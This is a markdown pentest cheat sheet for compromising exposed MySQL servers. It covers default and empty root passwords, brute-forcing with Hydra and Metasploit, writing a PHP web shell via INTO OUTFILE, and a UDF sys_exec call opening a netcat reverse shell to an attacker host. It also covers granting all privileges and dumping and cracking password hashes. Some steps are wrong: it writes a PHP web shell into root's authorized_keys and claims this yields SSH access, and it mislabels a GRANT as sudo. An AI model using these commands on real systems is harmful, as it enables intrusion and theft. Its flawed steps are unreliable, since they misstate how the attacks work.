!!! tip "Start here"
    Try root with no password first: `mysql -h <target> -u root` (no `-p` flag). Many dev/staging instances have no root password set. If that fails, try `root:root`, `root:mysql`, `root:toor`. Remote MySQL exposure is almost always a misconfiguration — check if `FILE` privilege is available to write a web shell.

## Enumeration
### Check for Open MySQL Ports
```bash
nmap -p 3306 --script mysql-info,mysql-users,mysql-enum,mysql-databases <target-ip>
```
## Authentication Attacks
### Brute-Force
Hydra:
```bash
hydra -L users.txt -P passwords.txt mysql://<target-ip>
```

MSF:
```bash
msfconsole
use auxiliary/scanner/mysql/mysql_login
set RHOSTS <target-ip>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

## Connecting to DB
```bash
mysql -h <target-ip> -u <username> -p
```

**Note:** If TLS error, try adding `--skip-ssl-verify-server-cert`

* try using `-u root` without a password 

Check for default credentials:
```bash
root:root
admin:admin
mysql:mysql
test:test
```

## Enumerating DB & Tables
List users:
```sql
SELECT user, host FROM mysql.user;
```

Check user privileges:
```sql
SHOW GRANTS FOR 'user'@'host';
```

List DBs
```sql
SHOW databases;
```

Select DB:
```sql
use database_name;
```

List tables in DB:
```sql
show tables;
```

Dump data into file:
```sql
SELECT * INTO OUTFILE '/var/www/html/dump.txt' FROM table_name;
```

## Exploitation
### Writing Files
If the MySQL user has FILE privileges, we can create a backdoor and obtain a web shell:
```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
```

Then access via:
```
http://target/shell.php?cmd=id
```

### Obtaining Shell via `sys_exec` or UDF Exploits
If User Defined Functions (UDFs) are enabled, execute system commands:
1. Upload malicious shared object (`.so`) file
```sql
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.so';
```

2. Execute commands
```sql
SELECT sys_exec('nc -e /bin/bash <attacker-ip> <port>');
```

## Privilege Escalation
### MySQL (Linux)
If MySQL runs as root, escalate privileges by writing to `.ssh/authorized_keys`
```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/root/.ssh/authorized_keys';
```

Then login via SSH as root:
```
ssh -i <key> root@<target>
```
### User Grants
If a low-privileged user has `FILE` or `EXECUTE` privileges, **escalate privileges**.
Check for dangerous privileges:
```sql
SELECT * FROM information_schema.user_privileges WHERE privilege_type='FILE' OR privilege_type='EXECUTE';
```

Enable SUDO privileges:
```sql
GRANT ALL PRIVILEGES ON *.* TO 'user'@'%' IDENTIFIED BY 'newpassword' WITH GRANT OPTION;
FLUSH PRIVILEGES;
```

## Retrieving Password Hashes
Dump user hashes:
```sql
SELECT host, user, authentication_string FROM mysql.user;
```

Crack with Hashcat:
```bash
hashcat -m 300 hashes /usr/share/wordlists/rockyou.txt
```